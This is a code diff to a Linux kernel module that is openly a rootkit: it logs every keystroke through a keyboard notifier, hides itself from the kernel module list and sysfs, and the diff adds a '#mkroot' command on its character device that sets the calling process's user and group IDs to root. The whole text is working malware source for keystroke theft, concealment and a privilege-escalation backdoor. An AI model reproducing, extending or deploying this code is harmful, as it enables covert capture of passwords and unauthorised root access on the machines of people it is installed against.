@@ -1,3 +1,5 @@
+#include <linux/cred.h>
+#include <linux/slab.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -8,6 +10,7 @@
 #include <asm/uaccess.h>
 #include <linux/buffer_head.h>
 #include <linux/string.h>
+#include <linux/sysfs.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -54,6 +57,8 @@ static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
+
+static struct kobject *testhold;
 
 static int major;
 static int is_open = 0;
@@ -125,7 +130,8 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 
 		hidden = 1;
 		mlist = THIS_MODULE->list.prev;
-
+		//testhold = kobject_get(&THIS_MODULE->mkobj.kobj);
+		
 		list_del(&THIS_MODULE->list);
 		kobject_del(&THIS_MODULE->mkobj.kobj);
 
@@ -136,8 +142,29 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 			return -EINVAL;
 
 		hidden = 0;
+		kobject_put(&THIS_MODULE->mkobj.kobj);
 		list_add(&THIS_MODULE->list, mlist);
-		res = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+
+		res = kobject_add(&THIS_MODULE->mkobj.kobj, 
+				THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+		
+		res = kobject_add(THIS_MODULE->holders_dir, 
+				THIS_MODULE->holders_dir->parent, "holders");
+
+		//kobject_register(&THIS_MODULE->mkobj.kobj);
+
+		//kobject_put(&THIS_MODULE->mkobj.kobj);
+		//kfree(&THIS_MODULE->mkobj.kobj);
+
+		//res = sysfs_create_dir_ns(&THIS_MODULE->mkobj.kobj, NULL);
+	} else if(strncmp("#mkroot", buff, 7) == 0) {
+		struct cred *creds = prepare_creds();
+		creds->uid.val = 0;
+		creds->euid.val = 0;
+		creds->gid.val = 0;
+		creds->egid.val = 0;
+
+		commit_creds(creds);
 	}	
 
 	return -EINVAL;
@@ -167,17 +194,15 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
 	    	}
 
 	    	down(&sem);
+
 	    	if(shiftKey == 0) {
 				strncat(keybuf, keymap[param->value][0], 
 		    		strlen(keymap[param->value][0]));
-			
-				printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
 	    	} else {
 				strncat(keybuf, keymap[param->value][1],
 					strlen(keymap[param->value][0]));
-
-				printk(KERN_INFO "%s \n", keymap[param->value][1]);
 	    	}
+
 	    	up(&sem);
 		}
 
@@ -188,6 +213,7 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
 
 static int __init init_klog(void) {
 	keybuf[0] = '\0';
+	hidden = 0;
 
     register_keyboard_notifier(&nb);
     printk(KERN_INFO "Registering keylager\n");
@@ -195,6 +221,7 @@ static int __init init_klog(void) {
 
 	major = register_chrdev(0, DEVICE_NAME, &fops);
 	printk(KERN_INFO "major: %d\n", major);
+	printk(KERN_INFO "module name: %s\n", THIS_MODULE->name);
 
     return 0;
 }
